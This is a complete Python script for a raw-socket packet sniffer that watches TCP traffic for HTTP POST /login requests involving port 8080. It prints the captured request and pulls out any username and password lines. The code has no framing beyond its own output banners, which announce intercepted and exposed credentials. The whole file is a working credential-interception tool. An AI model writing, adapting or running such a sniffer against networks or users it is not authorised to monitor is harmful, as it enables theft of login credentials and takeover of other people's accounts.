#!/usr/bin/env python3
import socket

def sniff():
    # Raw socket to capture TCP packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("Error: Run as root/sudo to capture packets")
        print("Usage: sudo python3 sniffer.py")
        return

    print("[SNIFFER] Listening for HTTP traffic on port 8080...")
    print("[SNIFFER] Waiting to intercept credentials...\n")

    while True:
        packet, addr = s.recvfrom(65565)

        # Parse IP header (20 bytes minimum)
        ip_header = packet[0:20]
        iph_length = (ip_header[0] & 0xF) * 4

        # Parse TCP header
        tcp_header = packet[iph_length:iph_length+20]
        tcph_length = ((tcp_header[12] >> 4) & 0xF) * 4

        # Extract payload
        header_size = iph_length + tcph_length
        data = packet[header_size:].decode('utf-8', errors='ignore')

        # Filter HTTP POST to port 8080
        if 'POST /login' in data and '8080' in data:
            print("\n" + "="*60)
            print("[INTERCEPTED] HTTP Request captured!")
            print("="*60)
            print(data)

            # Extract credentials
            if 'username' in data and 'password' in data:
                lines = data.split('\n')
                for line in lines:
                    if 'username' in line or 'password' in line:
                        print(f"\n[CREDENTIALS EXPOSED]: {line}")
            print("="*60 + "\n")

if __name__ == '__main__':
    sniff()
